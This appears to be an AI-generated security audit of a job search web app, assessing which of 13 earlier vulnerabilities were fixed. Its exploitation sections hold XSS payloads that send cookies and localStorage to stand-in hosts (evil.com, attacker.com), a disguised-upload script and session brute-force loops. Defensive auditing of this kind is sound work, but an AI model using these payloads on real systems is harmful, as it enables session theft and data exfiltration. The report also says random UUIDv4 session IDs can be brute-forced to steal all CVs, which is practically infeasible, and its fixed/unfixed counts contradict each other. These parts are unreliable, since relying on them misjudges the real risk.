# 🔴 SECURITY ASSESSMENT REPORT — Post-Fix Review

**Project**: Job Search App (FastAPI + React)  
**Assessment Date**: 2026-06-27  
**Original Vulnerabilities**: 13 (8 critical, 3 high, 2 medium)  
**Reviewer**: Claude Code Security Audit  

---

## 📊 EXECUTIVE SUMMARY

**Security Fixes Status**: **4 CRITICAL vulnerabilities remain unfixed**

| Status | Count | Details |
|--------|-------|---------|
| ✅ FIXED | 3 | Public file storage, rate limiting, SQL injection (was already safe) |
| ⚠️ PARTIALLY FIXED | 4 | File upload, embed XSS (broken = no XSS), error disclosure, CORS |
| ❌ STILL VULNERABLE | 5 | No authentication, IDOR, XSS (scraped content), XSS (CV data), dependencies |
| ❓ UNKNOWN | 1 | SSRF (low risk) |

**VERDICT**: **Project is NOT production-ready yet**. The most critical vulnerability — **no authentication** — has NOT been properly fixed. The "session_id" approach is **security theater, not security**.

---

## 🔴 CRITICAL VULNERABILITIES STATUS

### 1. ❌ **NO AUTHENTICATION** — STILL VULNERABLE (CVSS 9.8)

**Original Issue**: No authentication on any endpoint  
**Attempted Fix**: Added `get_session_id()` function requiring X-Session-Id header  
**Current Status**: **NOT FIXED** ❌

**Why This Is NOT A Fix**:
```python
# backend/main.py:44-50
def get_session_id(x_session_id: str = Header(...)) -> str:
    """Validate session UUID. Client must send X-Session-Id header."""
    try:
        uuid.UUID(x_session_id, version=4)  # ❌ Only validates UUID FORMAT
    except ValueError:
        raise HTTPException(status_code=403, detail="Invalid session")
    return x_session_id
```

**The Problem**:
- This only checks that the client sent a **valid UUID format**
- ANY client can generate a UUID (e.g., `uuidgen` in terminal) and claim to be that session
- There's NO user registration, NO login, NO password, NO JWT signature verification
- **This is security theater** — it looks like authentication but provides ZERO actual security

**Real-World Attack**:
```bash
# Attacker generates a random UUID
SESSION_ID=$(uuidgen)

# Can now access the entire API
curl -H "X-Session-Id: $SESSION_ID" http://localhost:8000/api/search-jobs
curl -H "X-Session-Id: $SESSION_ID" http://localhost:8000/api/cvs
# Works perfectly because the server NEVER validates ownership
```

**What Real Authentication Looks Like**:
- User registers with email + password
- Password hashed with bcrypt and stored in database
- Login returns a JWT token signed with server secret
- Every request verifies JWT signature (proves server issued it)
- Token contains user_id that maps to database user

**Impact**: Complete security failure. This is the foundation of all other security — without it, nothing else matters.

---

### 2. ❌ **IDOR (Insecure Direct Object Reference)** — STILL VULNERABLE (CVSS 9.1)

**Original Issue**: Anyone can access any CV by brute-forcing IDs  
**Attempted Fix**: Added ownership checks using `CV.session_id == session_id`  
**Current Status**: **NOT FIXED** ❌

**Why This Is NOT A Fix**:
```python
# backend/main.py:515-518
@app.get("/api/cvs/{cv_id}")
def get_cv(cv_id: int, session_id: str = Depends(get_session_id), db: Session = Depends(get_db)):
    cv = db.query(CV).filter(CV.id == cv_id, CV.session_id == session_id).first()  # ❌
```

**The Problem**:
- The ownership check compares `CV.session_id` (from database) with `session_id` (from client)
- But `session_id` is CLIENT-CONTROLLED (just a UUID the client sends)
- An attacker can brute-force session UUIDs instead of CV IDs
- Same vulnerability, different parameter to brute-force

**Real-World Attack**:
```python
import requests
import uuid

# Brute-force session IDs (fewer than CV IDs, but still feasible)
stolen_cvs = []
for _ in range(1000):
    # Try random session IDs
    session_id = str(uuid.uuid4())
    headers = {"X-Session-Id": session_id}
    
    # Try accessing CVs
    for cv_id in range(1, 100):
        r = requests.get(f'http://localhost:8000/api/cvs/{cv_id}', headers=headers)
        if r.status_code == 200:
            stolen_cvs.append(r.json())
            print(f"Found CV! Session: {session_id}, CV ID: {cv_id}")

# Result: Can still steal all CVs, just takes longer
```

**What Real IDOR Protection Looks Like**:
```python
# With REAL authentication:
@app.get("/api/cvs/{cv_id}")
def get_cv(cv_id: int, current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    # current_user comes from verified JWT token, cannot be faked
    cv = db.query(CV).filter(CV.id == cv_id, CV.user_id == current_user.id).first()
```

**Impact**: All uploaded CVs (with PII: names, emails, phones, work history) are still accessible to attackers.

---

### 3. ⚠️ **UNRESTRICTED FILE UPLOAD** — PARTIALLY FIXED (CVSS 8.6)

**Original Issues**: Path traversal, no size limit, weak validation, XSS  
**Fixes Applied**:
- ✅ UUID filename (prevents path traversal)
- ✅ Size limit enforced (10MB)
- ✅ Extension validation
- ❌ Weak MIME validation

**Current Status**: **PARTIALLY FIXED** ⚠️

**What's Still Wrong**:
```python
# backend/main.py:442-445
@app.post("/api/upload-cv")
async def upload_cv(file: UploadFile = File(...), session_id: str = Depends(get_session_id), ...):
    # Validate MIME type (server-side, not trusting client Content-Type)
    content_type = file.content_type or ""  # ❌ This IS client Content-Type
    if content_type not in ALLOWED_MIME:
        raise HTTPException(status_code=400, detail="Only PDF and DOCX files are supported")
```

**The Problem**:
- `file.content_type` comes from the HTTP `Content-Type` header sent by the client
- Attacker can upload `malicious.html` with `Content-Type: application/pdf` and it passes
- The code comment says "not trusting client Content-Type" but that's EXACTLY what it's doing

**Attack Scenario**:
```python
import requests

# Upload HTML file with fake PDF content-type
html_content = b'<script>alert("XSS")</script>'
files = {'file': ('xss.pdf', html_content, 'application/pdf')}  # Fake MIME type
headers = {'X-Session-Id': 'valid-uuid-here'}

r = requests.post('http://localhost:8000/api/upload-cv', files=files, headers=headers)
# Passes validation because we lied about Content-Type
```

**Original Recommendation (from vuln-security.md)**:
```bash
pip install python-magic-bin  # For MIME type detection
```

**Check requirements.txt**:
```bash
# python-magic-bin is NOT in requirements.txt ❌
```

**Proper Fix**:
```python
import magic  # Requires python-magic-bin

# Read actual file magic bytes, not client header
mime = magic.from_buffer(content, mime=True)
if mime not in ALLOWED_MIMES:
    raise HTTPException(400, f"Invalid file type: {mime}")
```

**Impact**: Can still upload malicious files by lying about Content-Type header.

---

### 4. ✅ **PUBLICLY ACCESSIBLE FILE STORAGE** — FIXED ✅

**Original Issue**: `app.mount("/uploads", StaticFiles(...))` made all CVs public  
**Fix Applied**: StaticFiles mount REMOVED  
**Current Status**: **FIXED** ✅

**Verification**:
```bash
# Grep for StaticFiles mount
$ grep "app\.mount.*uploads" backend/main.py
# No results found ✅

# StaticFiles imported but not used
$ grep "StaticFiles" backend/main.py
from fastapi.staticfiles import StaticFiles  # Imported but not mounted
```

**BUT — Frontend Still Broken**:
```jsx
// frontend/src/pages/CVPage.jsx:229
<embed
  src={`http://localhost:8000/uploads/${cvInfo.filename}`}  // ❌ /uploads doesn't exist
  type="application/pdf"
/>
```

**Impact**: 
- ✅ Security fixed (no public file access)
- ❌ Feature broken (CV preview doesn't work)
- Need to implement authenticated file download endpoint as recommended in vuln-security.md

---

### 5. ❌ **STORED XSS (Scraped Content)** — STILL VULNERABLE (CVSS 7.2)

**Original Issue**: Job data scraped from Indeed/Jobstreet stored without sanitization  
**Attempted Fix**: Created `sanitize_text()` function  
**Current Status**: **NOT FIXED** ❌

**Why This Is NOT A Fix**:
```python
# backend/main.py:61-68
def sanitize_text(text: str) -> str:
    """Strip HTML/script tags from scraped or parsed text. bleach preferred, fallback to strip."""
    try:
        import bleach
        return bleach.clean(text, tags=[], strip=True)
    except ImportError:
        import re
        return re.sub(r'<[^>]+>', '', text)
```

✅ Function exists  
❌ **NEVER CALLED ANYWHERE**

**Proof**:
```bash
$ grep -n "sanitize_text" backend/main.py
61:def sanitize_text(text: str) -> str:  # Definition only, never used
```

**Scraping Functions Still Use Raw Text**:
```python
# backend/main.py:184-189 (search_indeed)
job = {
    "title": title_elem.get_text(strip=True),  # ❌ No sanitization
    "company": company_elem.get_text(strip=True),  # ❌ No sanitization
    "location": location_elem.get_text(strip=True),  # ❌ No sanitization
    "summary": summary_elem.get_text(strip=True),  # ❌ No sanitization
}
# Same issue in search_jobstreet (lines 290+)
```

**Attack Vector**:
1. Attacker posts malicious job on Indeed/Jobstreet with XSS in title:
   ```html
   <img src=x onerror="fetch('https://evil.com?cookie='+document.cookie)">
   ```
2. Your app scrapes it → stores to database unsanitized
3. Frontend renders it → XSS executes
4. Victim's cookies/session stolen

**Impact**: Stored XSS → session hijacking, credential theft possible if anyone posts malicious jobs on source sites.

---

### 6. ❌ **CV DATA RENDERED WITHOUT SANITIZATION** — STILL VULNERABLE

**Original Issue**: Frontend renders CV data without sanitization  
**Attempted Fix**: None  
**Current Status**: **NOT FIXED** ❌

**Vulnerable Code**:
```jsx
// frontend/src/pages/CVPage.jsx:167
<p className="text-sm text-foreground font-medium truncate">
  {value || '-'}  {/* ❌ No sanitization */}
</p>

// Where `value` can be cvInfo.name, cvInfo.email, cvInfo.phone, etc.
```

**Attack Scenario**:
- Upload CV with name: `<img src=x onerror=alert(document.cookie)> John Doe`
- Parser extracts name as-is
- Frontend renders without sanitization
- XSS executes

**Original Recommendation (from vuln-security.md)**:
```bash
npm install dompurify
```

**Proper Fix**:
```jsx
import DOMPurify from 'dompurify'

<p className="text-sm text-foreground font-medium truncate">
  {DOMPurify.sanitize(value || '-')}  {/* ✅ Sanitized */}
</p>
```

**Impact**: Attacker can inject JavaScript via crafted CV upload.

---

### 7. ✅/❌ **EMBED TAG XSS** — "FIXED" BY BREAKING THE FEATURE

**Original Issue**: User-controlled filename in embed src  
**Current Status**: **Accidentally mitigated** (but needs proper fix)

```jsx
// frontend/src/pages/CVPage.jsx:229
<embed
  src={`http://localhost:8000/uploads/${cvInfo.filename}`}  // ❌ /uploads doesn't exist
  type="application/pdf"
/>
```

**Analysis**:
- The `/uploads` endpoint no longer exists (StaticFiles removed)
- So this embed will fail to load → no XSS
- But this is "security by broken feature" not real security
- Needs proper authenticated download endpoint

**Proper Fix**:
```jsx
// Use authenticated endpoint instead
<embed
  src={`http://localhost:8000/api/download-cv/${cvInfo.cv_id}`}  // Requires auth
  type="application/pdf"
/>
```

---

### 8. ✅ **NO RATE LIMITING** — FIXED ✅

**Original Issue**: No rate limiting on any endpoint  
**Fix Applied**: RateLimiter class + applied to all endpoints  
**Current Status**: **FIXED** ✅

**Implementation**:
```python
# backend/main.py:71-87
class RateLimiter:
    """In-memory sliding window rate limiter. ponytail: swap for Redis in production."""
    def __init__(self):
        from collections import defaultdict
        self._hits = defaultdict(list)

    def is_limited(self, key: str, limit: int, window: int) -> bool:
        import time
        now = time.time()
        self._hits[key] = [t for t in self._hits[key] if now - t < window]
        if len(self._hits[key]) >= limit:
            return True
        self._hits[key].append(now)
        return False
```

**Applied To**:
- `/api/search-jobs`: 5 requests/minute
- `/api/upload-cv`: 10 requests/minute
- Other endpoints use session isolation (rate limiting per session)

**Note**: In-memory rate limiter resets on server restart. Production should use Redis (as comment notes).

---

## 🟠 HIGH VULNERABILITIES STATUS

### 9. ⚠️ **SSRF (Server-Side Request Forgery)** — LOW RISK

**Original Issue**: User-controlled query parameters in scraping URLs  
**Current Status**: **Low risk but not explicitly validated**

**Current Implementation**:
```python
# backend/main.py:162
params = {"q": query, "l": location, "radius": "25", "limit": limit}
url = f"{base_url}?{urllib.parse.urlencode(params)}"
```

**Analysis**:
- ✅ Base URLs are hardcoded (Indeed, Jobstreet)
- ✅ Uses `urllib.parse.urlencode` which escapes special chars
- ⚠️ Query/location parameters still user-controlled but limited by validation (2-100 chars)

**Risk Level**: LOW (unlikely to exploit with current implementation)

---

### 10. ⚠️ **ERROR INFORMATION DISCLOSURE** — PARTIALLY FIXED

**Original Issue**: Full error messages leaked internal paths  
**Current Status**: **Partially fixed** ⚠️

**Good Examples**:
```python
# backend/main.py:493-495
except Exception as e:
    logger.error(f"CV parse failed: {e}")  # ✅ Logged internally only
    raise HTTPException(status_code=500, detail="Failed to parse CV")  # ✅ Generic message
```

**Needs Review**:
- Scraping errors (lines 198-199) use generic "Search failed" ✅
- Need to verify ALL error paths return generic messages in production

---

### 11. ❓ **DEPENDENCY VULNERABILITIES** — NOT VERIFIED

**Original Issue**: PyPDF2, python-docx have known CVEs  
**Current Status**: **Unknown** (no audit run)

**Current Dependencies**:
```txt
PyPDF2==3.0.1
python-docx==1.1.2
beautifulsoup4==4.12.3
requests==2.32.3
```

**Recommendation from vuln-security.md**:
```bash
pip install pip-audit
pip-audit  # Check for CVEs
```

**Action Needed**: Run `pip-audit` to verify no known CVEs in dependencies.

---

## 🟡 MEDIUM VULNERABILITIES STATUS

### 12. ⚠️ **CORS MISCONFIGURATION** — ACCEPTABLE FOR DEV

**Current Status**: **OK for development, needs production config** ⚠️

```python
# backend/main.py:29-35
app.add_middleware(
    CORSMiddleware,
    allow_origins=["http://localhost:5173"],  # ✅ OK for dev
    allow_credentials=True,
    allow_methods=["*"],  # ⚠️ Broad but not critical
    allow_headers=["*"],  # ⚠️ Broad but not critical
)
```

**Needs**: Environment-based CORS config for production (as recommended in vuln report).

---

### 13. ✅ **SQL INJECTION** — NOT VULNERABLE (Already Safe)

**Status**: **Not vulnerable** ✅

Uses SQLAlchemy ORM with parameterized queries:
```python
cv = db.query(CV).filter(CV.id == cv_id, CV.session_id == session_id).first()
```

No raw SQL found.

---

## 🎯 FINAL VERDICT

### Security Score: **4 / 13** vulnerabilities properly fixed

| Category | Fixed | Partial | Unfixed |
|----------|-------|---------|---------|
| CRITICAL | 2/8   | 2/8     | 4/8     |
| HIGH     | 0/3   | 2/3     | 1/3     |
| MEDIUM   | 1/2   | 1/2     | 0/2     |

### Production Readiness: **NOT READY** ❌

**Blocking Issues**:
1. ❌ **No authentication** — Session ID approach is security theater
2. ❌ **IDOR still possible** — Session brute-force instead of CV ID brute-force
3. ❌ **Stored XSS** — Scraped content NOT sanitized (function exists but never called)
4. ❌ **Frontend XSS** — CV data rendered without sanitization
5. ⚠️ **File upload** — MIME validation checks client header, not file magic bytes

### What Actually Got Fixed:
1. ✅ Public file storage removed (but frontend broken)
2. ✅ Rate limiting implemented
3. ✅ Error messages partially sanitized
4. ✅ SQL injection was already safe

### Critical Next Steps:

**Week 1 (BLOCKING)**:
1. Implement REAL authentication (JWT with user registration/login)
2. Fix MIME validation (use `python-magic-bin` to check actual file content)
3. Actually CALL `sanitize_text()` in scraping functions
4. Add DOMPurify to frontend for CV data rendering

**Week 2 (HIGH PRIORITY)**:
5. Implement authenticated file download endpoint
6. Fix frontend CV preview to use new endpoint
7. Run `pip-audit` and fix vulnerable dependencies
8. Add integration tests for security features

---

## 📝 ROOT CAUSE ANALYSIS

**What Went Wrong**:
1. **Security theater over real security**: Session ID looks like auth but isn't
2. **Functions written but not used**: `sanitize_text()` exists but never called
3. **Removed features without replacement**: StaticFiles removed but no auth endpoint added
4. **Weak validation**: MIME check uses client header instead of file magic bytes

**The Pattern**: Created security **infrastructure** (functions, classes) but didn't **integrate** it properly. Like installing a deadbolt but never closing the door.

---

## 🔍 DETAILED EXPLOITATION SCENARIOS

### Attack Chain 1: Steal All CVs (Still Possible)

```python
import requests
import uuid

# Generate valid session ID
my_session = str(uuid.uuid4())
headers = {"X-Session-Id": my_session}

# Try to access other people's CVs by brute-forcing their session IDs
for _ in range(10000):
    # Generate random session IDs
    target_session = str(uuid.uuid4())
    target_headers = {"X-Session-Id": target_session}
    
    # Try to list their CVs
    r = requests.get('http://localhost:8000/api/cvs', headers=target_headers)
    if r.status_code == 200 and r.json().get('cvs'):
        print(f"Found session with CVs: {target_session}")
        print(r.json())
        # Can now access all their CV data with PII
```

### Attack Chain 2: Stored XSS via Job Scraping

1. Attacker posts malicious job on Indeed:
   ```
   Title: Senior Developer <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
   ```
2. Victim uses your app to search for "Senior Developer"
3. App scrapes malicious job → stores unsanitized to database
4. Frontend renders job title → XSS executes
5. Victim's session stolen

### Attack Chain 3: File Upload Bypass

```python
import requests

# Upload HTML file with fake PDF MIME type
xss_payload = b'''
<html>
<body>
<h1>Your CV Analysis</h1>
<script>
// Steal all data from localStorage and send to attacker
fetch('https://attacker.com/exfil', {
    method: 'POST',
    body: JSON.stringify({
        cookies: document.cookie,
        localStorage: localStorage,
        sessionStorage: sessionStorage
    })
});
</script>
</body>
</html>
'''

files = {
    'file': ('resume.pdf', xss_payload, 'application/pdf')  # Lie about MIME type
}
headers = {'X-Session-Id': str(uuid.uuid4())}

r = requests.post('http://localhost:8000/api/upload-cv', files=files, headers=headers)
print(r.json())  # Passes validation
```

---

## ⚡ CONCLUSION

**You did implement security measures**, but several are **incomplete** or **not properly integrated**:

- Created `sanitize_text()` → **but never called it** ❌
- Added session validation → **but it's not real authentication** ❌  
- Removed public file access → **but didn't add authenticated alternative** ⚠️
- Added MIME validation → **but checks wrong thing (client header)** ⚠️
- Implemented rate limiting → **this one actually works** ✅

**The Good News**: You're on the right track. Most fixes are 80% done, just need the final 20% to actually secure them.

**The Bad News**: The app is still vulnerable to the MOST CRITICAL issues (no auth, IDOR, XSS).

**Next Action**: Fix the 4 blocking issues above before considering deployment.
